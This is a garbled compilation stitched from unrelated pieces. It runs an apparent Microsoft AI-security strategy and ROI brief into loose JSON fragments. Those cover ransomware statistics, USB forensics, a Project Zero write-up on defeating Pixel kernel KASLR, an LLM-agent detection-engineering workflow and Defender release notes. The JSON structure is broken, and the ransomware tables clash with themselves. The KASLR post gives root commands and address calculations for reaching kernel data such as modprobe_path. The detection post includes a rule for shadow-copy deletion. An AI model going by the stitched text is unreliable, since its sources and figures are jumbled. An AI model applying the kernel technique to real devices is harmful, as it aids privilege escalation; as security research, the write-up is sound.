Source: Statista AI in Cybersecurity Where do we see customers in adoption Journey Understanding where an organization stands in its AI adoption journey is the critical first step in formulating a successful strategy. The transition from recognizing AI's potential to harnessing it for transformative business value is not a single leap but a structured progression through distinct stages of maturity. Many organizations falter by pursuing technologically interesting projects that fail to solve core business problems, leading to wasted resources and disillusionment. A coherent maturity model provides a diagnostic tool to assess current capabilities and a roadmap to guide future investments, ensuring that each step of the journey is aligned with measurable business goals. From Awareness to Transformation: A Unified AI Maturity Model By synthesizing frameworks from leading industry analysts and practitioners, a comprehensive five-stage maturity model emerges. This model provides a clear pathway for organizations, detailing the characteristics, challenges, and objectives at each level of AI integration. Stage 1: Aware / Exploration This initial stage is characterized by an early interest in AI, where organizations recognize its potential but have limited to no practical experience. Activities are focused on research and education, with internal teams exploring different tools to understand their capabilities and potential business use cases. A common and effective starting point is conducting brainstorming workshops with key stakeholders to identify pressing business pain points and map them to potential AI solutions. The primary goal is to build initial familiarity and garner buy-in from leadership to move beyond theoretical discussions. The most significant challenge at this stage is the \"zero-to-one gap\"\u2014overcoming organizational inertia and a lack of executive sponsorship to secure the approval and resources needed for initial experimentation. Stage 2: Active / Experimentation In the experimentation phase, organizations have initiated small-scale pilot projects, often isolated within a data science team or a specific business unit. AI literacy remains limited, with only a few individuals or teams actively using AI tools in their daily work. A formal, enterprise-wide AI strategy is typically absent, leading to a fragmented approach where different teams may be experimenting with disparate tools. This is the stage where many organizations encounter the \"Production Chasm.\" While they may successfully develop prototypes, they struggle to move these models into a live production environment. This difficulty arises from a critical skills gap; the expertise required for production-level AI\u2014a multidisciplinary blend of data science, IT operations, and DevOps, often termed MLOps\u2014is fundamentally different and far rarer than the skills needed for experimental modeling. This chasm is widened by a misleading perception of what constitutes professional-grade AI, often formed through exposure to public tools, which lack the security, scalability, and deep integration required for enterprise use. Stage 3: Operational / Optimizing Organizations reaching this stage have successfully deployed one or more AI solutions into production. The focus now shifts from experimentation to optimization and scalability. The primary challenge is to move from isolated successes to consistent, repeatable processes that can be applied across the enterprise. This requires a deliberate strategic shift from scattered efforts to a structured portfolio of AI initiatives, each with a clear business case and measurable goals. Key activities include defining a formal AI strategy, investing in enterprise-grade tools, and launching broader initiatives to improve the AI literacy of the entire workforce, not just specialized teams. The objective is to achieve tangible improvements in productivity, efficiency, and business performance through the integration of AI into key processes. Stage 4: Systemic / Standardizing At the systemic stage, AI is no longer a collection of discrete projects but is deeply integrated into core business operations and workflows. The organization makes significant investments in enterprise-wide technology, including modern data platforms and robust governance frameworks, to ensure standardized and responsible usage of AI. A culture of innovation is fostered, encouraging employees to leverage AI tools to drive the business forward. The focus is on maximizing efficiency at scale, automating complex processes, and creating a sustainable competitive advantage through widespread gains in productivity and creativity. Stage 5: Transformational / Monetization This is the apex of AI maturity, a level achieved by only a few organizations. Here, AI is a central pillar of the corporate strategy and a key priority in executive-level budget allocation.3 The organization is recognized as an industry leader, leveraging AI not just to optimize existing operations but to completely transform them, creating entirely new revenue streams, innovative business models, and disruptive market offerings.4 The focus is on maximizing the bottom-line impact of AI across every facet of the business, from employee productivity to customer satisfaction and financial performance. Why using AI in defense is imperative Cybersecurity has entered an era where the speed, scale, and sophistication of attacks outpace traditional defenses. AI is no longer optional\u2014it\u2019s a strategic necessity for organizations aiming to protect critical assets and maintain resilience: 1. The Threat Landscape Has Changed AI-powered attacks are real and growing fast : Breakout times for breaches have dropped to under an hour , making manual detection and response obsolete. Attackers use AI to craft polymorphic malware, deepfakes, and automated phishing campaigns that bypass legacy security controls. Source: [mckinsey.com] 93% of security leaders fear AI-driven attacks, yet 69% see AI as the answer, and 62% of enterprises already use AI in defense. 2. AI Delivers Asymmetric Advantage Predictive Threat Intelligence: AI analyzes billions of signals to anticipate attacks before they occur, reducing downtime and mitigating risk. Automated Response: AI-driven SOCs cut response times from hours to seconds, isolating compromised endpoints and revoking malicious access instantly. Source: [analyticsinsight.net] Behavioral Analytics: Detects insider threats and anomalous activities that traditional tools miss, safeguarding identities and sensitive data 3. Operational Efficiency & Talent Gap Cybersecurity teams face a global shortage of skilled professionals. AI acts as a force multiplier, automating repetitive tasks and enabling analysts to focus on strategic threats. Organizations report 76% improvement in early threat detection and $2M+ savings per breach when leveraging AI-powered security solutions. Source: AI-Powered Security: The Future of Threat Detection and Response Microsoft approach to AI security As AI adoption accelerates, Microsoft has developed a multi-layered security strategy to protect AI systems, data, and identities while enabling innovation. This approach combines platform-level security , responsible AI principles , and advanced threat protection to ensure AI is deployed securely and ethically across enterprises. 1. Foundational Principles Microsoft\u2019s AI security strategy is grounded in: Responsible AI Principles: Fairness, privacy & security, inclusiveness, transparency, accountability, and reliability. These principles guide every stage of AI development and deployment. Secure Future Initiative (SFI): Embedding security by design, default, and deployment across AI workloads. 2. The Secure AI Framework Microsoft\u2019s Secure AI Framework (SAIF) provides a structured approach to securing AI environments: Prepare : Implement Zero Trust principles, secure identities, and configure environments for AI readiness. Discover : Gain visibility into AI usage, sensitive data flows, and potential vulnerabilities. Protect : Apply end-to-end security controls for data, models, and infrastructure. Govern : Enforce compliance with regulations like GDPR and the EU AI Act, and monitor AI interactions for risk. 3. Key Security Controls Data Security & Governance : o Microsoft Purview for Data Security Posture Management (DSPM) in AI prompts and completions. o Auto-classification, encryption, and risk-adaptive controls to prevent data leakage. Identity & Access Management : o Microsoft Entra for securing AI agents and enforcing least privileges with adaptive access policies. Threat Protection : o Microsoft Defender for AI integrates with Defender for Cloud to detect prompt injection, model poisoning, and jailbreak attempts in real time. Compliance & Monitoring : o Continuous posture assessments aligned with ISO 42001 and NIST AI RMF. 4. Security by Design Microsoft embeds security throughout the AI lifecycle: Secure Development Lifecycle (SDL) for AI models. AI Red Teaming using tools like PyRIT to simulate adversarial attacks and validate resilience. Content Safety Systems in Azure AI Foundry to block harmful or inappropriate outputs. 5. Integrated Security Ecosystem Microsoft\u2019s AI security capabilities are deeply integrated across its portfolio: Microsoft Defender XDR : Correlates AI workload alerts with broader threat intelligence. Microsoft Sentinel : Provides graph-based context for AI-driven threat investigations. Security Copilot : AI-powered assistant for SOC teams, accelerating detection and response. Market research on ROI and Cost Savings from securing AI Investing in a robust security framework for AI is not merely a defensive measure or a cost center; it is a strategic investment that yields a quantifiable and compelling return. Independent market analysis conducted by leading firms like Forrester and IDC, along with real-world customer case studies, provides extensive evidence that deploying Microsoft's unified security platform delivers significant financial benefits. These benefits manifest in two primary ways: a \"defensive\" ROI derived from mitigating risks and reducing costs, and an \"offensive\" ROI achieved by enabling the secure and rapid adoption of high-value AI initiatives that drive business growth. A recurring and powerful theme across these studies is that platform consolidation is a major, often underestimated, value driver. A significant portion of the quantified ROI comes from retiring a fragmented stack of legacy point solutions and eliminating the associated licensing, infrastructure, and specialized labor costs, allowing the investment in the Microsoft platform to be funded, in part or in whole, by reallocating existing budget. The Total Economic Impact\u2122 of a Unified Security Posture Microsoft has commissioned Forrester Consulting to conduct a series of Total Economic Impact\u2122 (TEI) studies on its core security products. These studies, based on interviews with real-world customers, construct a \"composite organization\" to model the financial costs and benefits over a three-year period. The results consistently show a strong positive ROI across the platform. Microsoft Purview: The TEI study on Microsoft Purview found that the composite organization experienced benefits of $3.0 million over three years versus costs of $633,000, resulting in a net present value (NPV) of $2.3 million and an impressive 355% ROI . The primary value drivers included reduced data breach impact, significant efficiency gains for security and compliance teams, and the avoidance of costs associated with legacy data governance tools. Microsoft Sentinel: For Microsoft Sentinel, the Forrester study calculated an NPV of $7.9 million and a 234% ROI over three years. Key financial benefits were derived from a 44% reduction in TCO by replacing expensive, on-premises legacy SIEM solutions, a dramatic 79% reduction in false-positive alerts that freed up analyst time, and a 35% reduction in the likelihood of a data breach. Microsoft Defender: The unified Microsoft Defender XDR platform delivered an NPV of $12.6 million and a 242% ROI over three years, with an exceptionally short payback period of less than six months. The benefits were substantial, including up to $12 million in savings from vendor consolidation, $2.4 million from SecOps optimization, and $2.8 million from the reduced cost of material breaches. Microsoft Security Copilot: As a newer technology, the TEI for Security Copilot is a projection. Forrester projects a three-year ROI ranging from a low of 99% to a high of 348% , with a medium impact scenario yielding a 224% ROI and an NPV of $1.13 million. This return is driven almost entirely by amplified SecOps team efficiency, with projected productivity gains on security tasks ranging from 23% to 46.7%, and cost efficiencies from a reduced reliance on third-party managed security services. The following table aggregates the headline financial metrics from these independent Forrester TEI studies, providing a clear, at-a-glance summary of the platform's investment value. Table: Aggregated Financial Impact of Microsoft AI Security Solutions (Forrester TEI Data) Microsoft Solution 3-Year ROI (%) 3-Year NPV ($M) Payback Period (Months) Key Value Drivers Microsoft Purview 355% $2.3 Reduced breach likelihood by 30%, 75% faster investigations, 60% less manual compliance effort, legacy tool consolidation. Microsoft Sentinel 234% $7.9 44% TCO reduction vs. legacy SIEM, 79% reduction in false positives, 85% less effort for advanced investigations. Microsoft Defender 242% $12.6 Up to $12M in vendor consolidation savings, 30% faster threat remediation, 80% less effort to respond to incidents. Security Copilot 99% - 348% (Projected) $0.5 - $1.76 (Projected) Not Specified 23%-47% productivity gains for SecOps tasks, reduced reliance on third-party services, upskilling of security personnel. Microsoft Entra Suite 131% $8.2 Not Specified 30% reduction in identity risk, 80% reduction in user management time, 90% fewer password reset tickets, 60% VPN license reduction. Quantifying Risk Reduction and Its Financial Impact A core component of the ROI calculation is the direct financial savings from preventing and mitigating security incidents. Reduced Likelihood of Data Breaches: The Forrester study on Microsoft Purview quantified a 30% reduction in the likelihood of a data breach for the composite organization. This translated into over $225,000 in annual savings from avoided costs of security incidents and regulatory fines. The study on Microsoft Sentinel found a similar 35% reduction in breach likelihood, which was valued at $2.8 million over the three-year analysis period. These figures provide a tangible financial value for improved security posture. The Cost of Inaction: The financial case is further strengthened when contrasted with the high cost of failure. The Forrester study on Microsoft Defender highlights that organizations with insufficient incident response capabilities spend an average of $204,000 more per breach and experience nearly one additional breach per year compared to their more prepared peers. This underscores that the investment in a modern, unified platform is an effective insurance policy against significantly higher future costs. Driving SOC Efficiency and Cost Optimization Beyond risk reduction, the Microsoft security platform drives substantial cost savings through automation, AI-powered efficiency, and platform consolidation. These savings free up both budget and highly skilled personnel to focus on more strategic, value-added activities. Faster Mean Time to Respond (MTTR): Time is money during a security incident. The platform's AI and automation capabilities dramatically accelerate the entire response lifecycle. The Sentinel TEI found that its AI-driven correlation engine reduced the manual labor effort for advanced, multi-touch investigations by 85% . The Defender TEI noted that security teams could remediate threats 30% faster , reducing the mean time to acknowledge (MTTA) from 30 minutes to just 15, and cutting the mean time to resolve (MTTR) from up to three hours to less than one hour in many cases. Similarly, Purview was found to reduce the time security teams spent on investigations by 75% . Legacy Tool and Cost Avoidance: Consolidating on the Microsoft platform allows organizations to retire a host of redundant security and compliance tools. The Purview study identified nearly $500,000 in savings over three years from sunsetting legacy records management and data security solutions. The Defender study attributed up to a massive $12 million in benefits over three years to vendor consolidation, eliminating licensing, maintenance, and management costs from other tools. The Microsoft Entra Suite was found to reduce VPN license usage by 60%, saving an estimated $680,000 over three years. Reduced IT Overhead and Labor Costs: Automation extends beyond the SOC to general IT operations. The Microsoft Entra study found that automated governance and lifecycle workflows reduced the time IT spent on ongoing user management by 80% , yielding $4.6 million in time savings over three years. The same study noted a 90% reduction in password reset help desk tickets, from 80,000 to just 8,000 per year, avoiding $2.6 million in support costs.

      "summary": "The worldwide ransomware landscape saw a dramatic shift in attacks in October 2025, jumping 41% month over month, with the most prolific attacker, Qlin, more than doubling the number of attacks it launched, according to Trustwave, A LevelBlue Company, research. The US remained the primary recipient of ransomware attacks, but October saw manufacturing overtake technology as the most targeted vertical sector. The ransomware information was derived from a new SpiderLabs ransomware-tracking tool that gathers information from a variety of open intelligence sources and our own proprietary research. This unique combination of open-source and in-house research provides new insights into ransomware attack trends, the threat groups involved, and their primary targets. The data is not all-inclusive but contains enough information to draw basic conclusions on the direction attacks are taking. October Attack Figures In October 2025, SpiderLabs recorded 722 ransomware attacks worldwide, up from 492 in September 2025 and 635 in October 2024. As noted, the US was the nation most under attack with 298 incidents noted, followed by Canada and France with 45 and 25 attacks, respectively. Top 5 Threat Groups Qlin again dominated the stage, but there were some changes in the top five list. Sinobi appeared in third place, pushing Incransom down to fourth and Play to fifth. A quick breakdown of the new threat actor on the list: According to Ransomware.live, Sinobi became active in July 2025 and has so far specialized in attacking healthcare, manufacturing, and construction firms. Top Threat Groups for October 2025 Threat Groups Oct. 2025 Number of Attacks Threat Groups Sept. 2025 Number of Attacks Qilin 191 or 26.5% Qlin 61 or 15.2% Akira 71 or 9.8% Akira 42 or 10.4% Sinobi 62 or 8.6% Sinobi 36 or 8.9% Incransom 30 or 4.3% Incransom 31 or 7.7% Play 22 or 3.1% Play 29 or 7.2% Top Vertical Sectors Targeted for October 2025 Sector Oct. 2025 Number of Attacks as a % Sector Sept. 2025 Number of Attacks as a % Manufacturing 101 or 14% Business Services 150 or 23.6% Technology 76 or 10.5% Manufacturing 84 or 13.2% Healthcare 59 or 8.2% Technology 79 or 12.4% Business Services 33 or 4.6% Healthcare 63 or 10% Construction 29 or 4% Government 38 or 6% SpiderLabs\u2019 research noted a major shift in targeting when data is examined year over year. In October of 2024, business services were the most often targeted vertical sector, followed by manufacturing and technology. 2025 Ransomware Attacks to Date Threat Group Number of Attacks Target Sector Number of Attacks Qilin 724 or 11.6% Manufacturing 726 or 11.7% Akira 577 or 9.2% Technology 735 or 11.7% Sinobi 419 or 6.7% Healthcare 420 or 6.8% Incransom 332 or 5.3% Business Services 334 or 5.3% Play 283 or 4.5% Financial Services 311 or 5% Total attacks tracked to date for 2025 are 6,251, up dramatically from the 4,660 SpiderLabs saw in 2024.

      "title": "Analysis Playbooks: USB",
      "summary": "In 2005, Cory Altheide and I published the first peer-reviewed paper to address tracking USB devices on Windows systems. Over the years, it's been pretty amazing to see not only the artifacts expand and evolve, but to also see folks pick up the baton and carry on with describing what amounts to a \"playbook\" for developing this information as part of an investigation. Not only did malware such as Raspberry Robin propagate via USB devices, but with the rise of other devices that could be attached via a USB connection, but use different protocols, it became more important to operationalize this analysis in a playbook. After all, why not take the inefficient, error-prone, purely manual aspects out of the parsing by automating it? Morad R. put together a series of posts that outline different data/artifact sources you can examine to identify USB devices that had been connected to the endpoint, as well as attribute the use of the devices to a particular user. This series of posts illustrates some steps that begin the process of pulling back the veil, if you will, to unraveling the use of USB devices on Windows systems. While there is definitely more to be done and shared, the important common factor across the posts is the use of timelines. USB Forensics, pt 1: Unmasking the connected device - Focuses on the System Registry hive, and extracting time stamps from Properties key values. The focus on a timeline is great way to get started on this, as doing so takes the analyst directly to context. However, by focusing on just USB and USBStor keys in the System hive, other devices (smartphones, digital cameras) are missed. However, that's not really an issue, per se, as the same playbook can be applied to the appropriate Registry keys. USB Forensics, pt 2: Mapping device to user & drive letter - focuses on the user's NTUSER.DAT, but doesn't mention other artifacts, such as shellbags, RecentDocs, UserAssist, etc., that could be used to correlate additional user activity with the device, particularly via a timeline. RegRipper still makes use of \" profiles \", which is the term I used to describe what became known as \"playbooks\". Or, another way to look at it is that you can implement playbooks through these profiles. USB Forensics, pt 3: The Event Log timeline - focus on a timeline continues, which is good. However, the logs are technically referred to as \"Windows Event Logs\"; \"Event Logs\" refer to the Windows 2000, XP, and 2003 era logs. I understand, I 'get it', that this is a distinction without a difference for most analysts, particularly those who've never had to work with Event Log records from older systems, and are only familiar with the new format implemented as of Windows Vista. All three of these posts, together, serve as a good foundation, and a great first step toward addressing USB-connected devices on Windows endpoints. Just as the field has grown and expanded since 2005, it will continue to do so in the future. In addition to providing the data sources, the underlying reliance on (or at least pointing in the direction of) timelines is, I believe, foundational. Start with a timeline, do not let a timeline be something you assemble manually, after everything else is done. We can always add or remove data sources, create new RegRipper or Events Ripper plugins, etc., but creating a timeline should be \"first principles\". In my current role, I don't have a need to determine things such as USB devices connected to a Windows system, but if I did, I'd definitely have Events Ripper plugins to extract that information, maybe even correlate it, into an easy-to-view manner.

      "title": "Defeating KASLR by Doing Nothing at All",
      "summary": "Posted by Seth Jenkins, Project Zero Introduction I've recently been researching Pixel kernel exploitation and as part of this research I found myself with an excellent arbitrary write primitive\u2026but without a KASLR leak. As necessity is the mother of all invention, on a hunch, I started researching the Linux kernel linear mapping. The Linux Linear Mapping The linear mapping is a region in the kernel virtual address space that is a direct 1:1 unstructured representation of physical memory. Working with Jann, I learned how the kernel decided where to place this region in the virtual address space. To make it possible to analyze kernel internals on a rooted phone, Jann wrote a tool to call tracing BPF's privileged BPF_FUNC_probe_read_kernel helper, which by design permits arbitrary kernel reads. The code for this is available here . The linear mapping virtual address for a given physical address is calculated by the following macro: #define phys_to_virt(x) ((unsigned long)((x) - PHYS_OFFSET) | PAGE_OFFSET) On Arm64 PAGE_OFFSET is simply: #define VA_BITS (CONFIG_ARM64_VA_BITS) #define _PAGE_OFFSET(va) (-(UL(1) (va))) #define PAGE_OFFSET (_PAGE_OFFSET(VA_BITS)) As CONFIG_ARM64_VA_BITS is 39 on Android, it\u2019s easy to calculate PAGE_OFFSET = 0xffffff8000000000 . PHYS_OFFSET is calculated by: extern s64 memstart_addr; /* PHYS_OFFSET - the physical address of the start of memory. */ #define PHYS_OFFSET ({ VM_BUG_ON(memstart_addr & 1); memstart_addr; }) memstart_addr is an exported variable that can be looked up in /proc/kallsyms . Using Jann\u2019s bpf_arb_read program, it\u2019s easy to see what this value is: tokay:/ # grep memstart /proc/kallsyms ffffffee6d3b2b20 D memstart_addr ffffffee6d3f2f80 r __ksymtab_memstart_addr ffffffee6dd86cc8 D memstart_offset_seed tokay:/ # cd /data/local/tmp tokay:/data/local/tmp # ./bpf_arb_read ffffffee6d3b2b20 8 ffffffee6d3b2b20 00 00 00 80 00 00 00 00 |........| tokay:/data/local/tmp # This value ( 0x80000000 ) doesn\u2019t look particularly random. In fact, memstart_addr was theoretically randomized on every boot, but in practice this hasn\u2019t happened for a while on arm64. In fact as of commit 1db780bafa4c it\u2019s no longer even theoretical - virtual address randomization of the linear map is no longer a supported feature in arm64 Linux kernel. The systemic issue is that memory can (theoretically) be hot plugged in Linux and on Android because of CONFIG_MEMORY_HOTPLUG=y . This feature is enabled on Android due to its usage in VM memory sharing. When new memory is plugged into an already running system, it must be possible for the Linux kernel to address this new memory, including adding it onto the linear map. Android on arm64 uses a page size of 4 KiB and 3-level paging, which means virtual addresses in the kernel are limited to 39 bits, unlike typical X86-64 desktops which use 4-level paging and have 48 bits of virtual address space (for kernel and userspace combined); the linear map has to fit within this space further shrinking the area available for it. Given that the maximum amount of theoretical physical memory is far larger than the entire possible linear map region range, the kernel places the linear map at the lowest possible virtual address so it can theoretically be prepared to handle exorbitant (up to 256GB) quantities of hypothetical future hot-plugged physical memory. While it is not technically necessary to choose between memory hot-plugging support and linear map randomization, the Linux kernel developers decided not to invest the engineering effort to implement memory hot-plugging in a way that preserves linear map randomization. So we now know that PHYS_OFFSET will always be 0x80000000 , and thusly, the phys_to_virt calculation becomes purely static - given any physical address, you can calculate the corresponding linear map virtual address by the following formula: #define phys_to_virt(x) ((unsigned long)((x) - 0x80000000) | 0xffffff8000000000) Kernel physical address non-randomization Compounding this issue, it also happens that on Pixel phones, the bootloader decompresses the kernel itself at the same physical address every boot: 0x80010000 . tokay:/ # grep Kernel /proc/iomem 80010000-81baffff : Kernel code 81fc0000-8225ffff : Kernel data Theoretically, the bootloader can place the kernel at a random physical address every boot, and many (but not all) other phones, such as the Samsung S25, do this. Unfortunately, Pixel phones are an example of a device that simply decompresses the kernel at a static physical address. Calculating static kernel virtual addresses This means that we can statically calculate a kernel virtual address for any kernel .data entry. Here\u2019s an example of me computing that linear map address for the modprobe_path string in kernel .data on a Pixel 9: tokay:/ # grep modprobe_path /proc/kallsyms ffffffee6ddf2398 D modprobe_path tokay:/ # grep stext /proc/kallsyms ffffffee6be10000 T _stext //Offset from kernel base will be 0xffffffee6ddf2398 - 0xffffffee6be10000 = 0x1fe2398 //Physical address will be 0x80010000 + 0x1fe2398 = 0x81ff2398 //phys_to_virt( 0x81ff2398 ) = 0xffffff8001ff2398 tokay:/ # /data/local/tmp/bpf_arb_read ffffff8001ff2398 64 ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 |.system/bin/modp| ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 |robe............| [ zeroes ] tokay:/ # reboot sethjenkins@sethjenkins91:~$ adb shell tokay:/ $ su tokay:/ # /data/local/tmp/bpf_arb_read ffffff8001ff2398 64 ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 |.system/bin/modp| ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 |robe............| [ zeroes ] tokay:/ # So modprobe_path will always be accessible at the kernel virtual address 0xffffff8001ff2398 , in addition to its normal mapping, even with KASLR enabled. In practice, on Pixel devices you can derive a valid virtual address for a kernel symbol by calculating its offset and simply adding a hardcoded static kernel base address of 0xffffff8000010000 . In short, instead of breaking the KASLR slide, it is possible to just use 0xffffff8000010000 as a kernel base instead. The linear mapping memory is even mapped rw for any kernel .data regions. The only consolation that makes using this address slightly less effective than the traditional method of leaking the KASLR slide is that .text regions are not mapped executable - so an attacker cannot use this base for e.g. ROP gadgets or more generally PC control. But oftentimes, a Linux kernel attacker\u2019s goal isn\u2019t arbitrary code execution in kernel context anyway - arbitrary read-write is the more frequently desired primitive. Impact on devices with kernel physical address randomization Even on devices where the kernel location is randomized in the physical address space, linear mapping non-randomization still softens the kernel considerably to attempts at exploitation. This is particularly because techniques that involve spraying memory (either kernel structures or even userland mmap\u2019s!) can land at predictable physical addresses - and those physical addresses are easily referenceable in kernel virtual address space through the linear map. That potentially gives an attacker a methodology for placing kernel data structures or even simply attacker-controlled userland memory at a known kernel virtual address. I created a simple program that allocated (via mmap and page fault) a substantial quantity (~5 GB) of physical memory on a Samsung S23, then used /proc/pagemap to create a list of which physical page frame numbers (pfns) were allocated. I ran this program 100 times (rebooting in between each time), then counted how often each pfn appeared across the 100 execution cycles. The set of pfns and their counts for how often they appeared were then converted into an image where each pfn is represented by a single pixel. The brighter the green of a pixel, the more often that page was attacker controlled, with a white pixel representing a pfn that was allocated every time. A black pixel represents a pfn that was never allocated - often because those pfn numbers are not mapped to physical memory or because they are used every time in a deterministic way. A big thank you to Jann Horn for developing the tool to create this image from the data that I collected. This data exemplifies the non-homogenous reliability of pfn allocation to userland mappings, albeit on a device that was only just rebooted. There are ranges of pfns that are allocated quite reliably, and other ranges that are quite unreliable (but still occasionally used). For example, here\u2019s a range of pfns surrounding one of the pages that was allocated 100 times in a row. I suspect this sample is representative of the practical reliability of this technique for placing desired data at a known kernel address for at least a newly rebooted device. While reliability may suffer on a device that hasn\u2019t rebooted in some time, it remains high enough to be inviting to real-world attackers. Being able to place arbitrarily readable and writable data at a known kernel virtual address is a powerful exploitation primitive as an attacker can much more easily forge kernel data structures or objects and, for example, emplace pointers to those objects in heap sprays attacking UAF issues. The Prognosis I reported these two separate issues, lack of linear map randomization , and kernel lands at static physical address in Pixel , to the Linux kernel team and Google Pixel respectively. However both of these issues are considered intended behavior. While Pixel may introduce randomized physical kernel load addresses at some later point as a feature, there are no immediate plans to resolve the lack of randomization of the Linux kernel\u2019s linear map on arm64. Conclusion Three years ago, I wrote on the state of x86 KASLR and noted how \u201cit is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.\u201d While it remains true that KASLR should not be trusted to prevent exploitation, particularly in local contexts, it is regrettable that the attitude around Linux KASLR is so fatalistic that putting in the engineering effort to preserve its remaining integrity is not considered to be worthwhile. The joint effect of these two issues dramatically simplified what might otherwise have been a more complicated and likely less reliable exploit. While side-channel attacks do impact the long-term viability of KASLR on all architectures, it is notable that Project Zero and the Google Threat Intelligence Group have yet to see a hardware side-channel attack for bypassing KASLR on Android in the wild. Additionally, KASLR still plays an important role in mitigating any remote kernel exploitation attempts. It is valuable from a security in-depth perspective to recognize the impact KASLR has on exploit complexity and reliability in real-world scenarios. In the future, we hope to see changes to the Linux kernel linear mapping and memory hot-plugging implementation to make this a less inviting target for attackers. Randomizing the location of the linear map in the virtual address space, increasing the entropy in physical page allocation , and randomizing the location of the kernel in the physical address space are all concrete steps that can be taken that would improve the overall security posture of Android, the Linux kernel, and Pixel.",

      "title": "Agentic Detection Creation: From Sigma to Splunk Rules (or any platform)",
      "summary": "Detection engineering is one of the most repetitive and time-consuming areas in modern security operations. Writing rules, mapping them to MITRE ATT&CK techniques, validating the output, and preparing documentation. All of this often requires hours of manual effort and deep platform & field expertise. TL;DR An n8n-based automated workflow that uses LLM agents to generate Sigma rules, map them to MITRE ATT&CK, convert them into Splunk SPL (or any SIEM query), validate them, and automatically deliver reports. Turning detection engineering into a fully autonomous process. Agentic Detection Engineering Workflow Once the project is fully polished, I might publish the workflow and related resources on my GitHub. Feel free to follow me there to catch the release when it\u2019s ready. krdmnbrk - Overview Why I Automate the Detection Pipeline? Detection engineer teams manage too much detection requests each month. Each new rule must: Align with detection logic and taxonomy Include MITRE ATT&CK mappings for threat coverage tracking Be formatted in Sigma for portability (not required but nice to have) Be converted into the correct SIEM query syntax (Splunk, Sentinel, Elastic, QRadar, etc.) Be validated, documented, and shared with analysts Manually completing these steps is inefficient and inconsistent. Automation ensures repeatability, quality, and rapid delivery. The Architecture This workflow runs as a modular n8n pipeline, orchestrating multiple AI-driven agents and validation layers to manage every stage of the detection lifecycle. Step 1 - Chat-Based Trigger It all begins with a chat command, such as: \u201cCreate a detection rule that detects deleting shadow copies.\u201d The workflow initializes a session, assigns unique IDs, and builds structured context for rule generation. Step 2 - Detection Developer Agent The Detection Developer Agent is the brain of the operation. It: Generates a Sigma rule based on the given prompt. Adapts field names and logic to match environment-specific schemas. Automatically performs MITRE ATT&CK mapping for related techniques and sub-techniques. Tags detections with standardized metadata (platform, severity, category, etc.). The Sigma rule is then sent to the Reviewer Agent for quality checks. Step 3 - Reviewer Agent The Reviewer Agent ensures the Sigma rule is correct, complete, and consistent with organizational standards. It reviews: Logical flow and field usage MITRE mapping accuracy Syntax and naming conventions Alignment with existing taxonomies Once approved, the rule moves to the conversion phase. Step 4 - Sigma \u2192 SIEM Query Conversion The approved Sigma rule is automatically converted into a SIEM query. In my setup, I focused on Splunk SPL conversion using sigconverter.io , since Splunk was my validation environment. However, the same architecture supports other query languages with minimal modification, including: Cortex XDR Elastic QRadar Kusto For more detail: https://github.com/SigmaHQ/sigma-cli https://sigconverter.io/ This modular conversion layer ensures flexibility and scalability for any detection stack. Before Step 5, Why I Start with Sigma First? A possible question is: \u201cIf the final goal is to generate a Splunk query, why not produce SPL directly?\u201d The answer lies in structure, documentation, and accuracy . Sigma is a vendor-neutral detection standard designed to be human-readable, well-documented, and structured around consistent logic. Large Language Models (LLMs) also perform significantly better when generating Sigma compared to direct SPL output. Sigma\u2019s YAML-based format enforces clear separation of title, description, condition, and fields , making it easier for LLMs to reason and produce valid results. Once a clean Sigma rule exists, translation tools like sigconverter.io can reliably convert it into Splunk SPL (or any other SIEM query language). This two-step approach results in cleaner, more accurate, and more portable detections across different platforms. Step 5 - SPL Validation The Validation Agent ensures that the resulting query is production-ready. It performs: Execution tests via Splunk REST API Macro validation for dependency resolution CIM/datamodel checks for schema alignment LLM-based analysis (Sonnet 4.5) for logic and syntax verification This ensures the generated SPL is operational, consistent, and free of syntax or mapping issues. Step 6 - Automated Reporting After validation, the Detection Reporter Agent compiles all artifacts, Sigma, SIEM query, MITRE mapping, and metadata, into structured reports. These reports are exported as HTML, PDF, and Markdown , then automatically shared through Microsoft Teams, mail. Example Run Input Create a detection rule that detects deleting shadow copies via cmd. Output SPL | tstats summariesonly=false allow_old_summaries=true fillnull_value=\"null\" count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=\"vssadmin.exe\" Processes.process=\"*shadow*\" Processes.process=\"*delete*\" by Processes.process Processes.dest Processes.process_current_directory Processes.process_path Processes.process_integrity_level Processes.original_file_name Processes.parent_process Processes.parent_process_path Processes.parent_process_guid Processes.parent_process_id Processes.process_guid Processes.process_id Processes.user | `drop_dm_object_name(Processes)` | convert timeformat=\"%Y-%m-%dT%H:%M:%S\" ctime(firstTime) | convert timeformat=\"%Y-%m-%dT%H:%M:%S\" ctime(lastTime) Tech Stack n8n: Workflow orchestration sigconverter.io: Sigma \u2192 SIEM query translation Splunk REST API: Query execution and validation LLM (Sonnet 4.5): Semantic validation and review Teams / Gmail: Reporting and distribution Key Benefits End-to-end automation of the detection engineering lifecycle Automatic MITRE ATT&CK mapping for coverage alignment Improved accuracy through Sigma-first generation Support for multiple SIEM backends Standardized documentation and automated reporting What\u2019s Next I\u2019m currently extending this workflow by integrating Atomic Red Team or enterprise BAS ( Breach and Attack Simulation ) tools to automatically test the detections after they\u2019re generated.

Microsoft Defender for Endpoint End of Windows 10 Support: What Defender Customers Need to Know As of October 14, 2025, Microsoft officially ended support for Windows 10. This means that Windows 10 devices will no longer receive security or feature updates, nor technical support from Microsoft. While these devices will continue to operate, the lack of regular security updates increases vulnerability to cyber threats, including malware and viruses. Applications running on Windows 10 may also lose support as the platform stops receiving updates. Endpoint Security Policies can now be distributed via MTO's (Multi Tenant Organization) Content Distribution capability . This capability moved from Public Preview to General Availability (GA). With this capability, you can create content distribution profiles in the multi-tenant portal that allow you to seamlessly replicate existing content - such as custom detection rules and now, endpoint security policies - from a source tenant to designated target tenants. Once distributed, the content runs on the target tenant, enabling centralized control with localized execution. You can read the announcement blog for public preview , as the content shares valuable insights. (Public Preview) Streamlined connectivity support for US government environments (GCC, GCC High, DoD).
